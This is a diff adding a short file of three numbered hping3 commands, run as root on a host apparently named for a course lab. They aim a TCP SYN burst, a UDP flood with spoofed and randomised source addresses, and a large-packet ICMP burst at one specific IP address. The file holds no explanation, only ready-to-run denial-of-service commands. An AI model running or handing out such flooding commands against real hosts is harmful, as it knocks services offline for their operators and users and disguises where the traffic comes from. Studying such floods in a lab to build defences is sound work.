@@ -1,0 +1,9 @@
+#1
+root@comp3134-Winter2024:/var/www/html# hping3 -c 10000 -i u1 -S -p 80 -r 159.203.5.106
+
+#2
+root@comp3134-Winter2024:/var/www/html# hping3 -c 9000 -i u1 -a 192.0.2.0 -2 -p 80 -d 100 --flood --rand-source 159.203.5.106
+
+
+#3
+root@comp3134-Winter2024:/var/www/html# hping3 -c 11000 -i u0.013 -d 1024 -1 -C 75 159.203.5.106
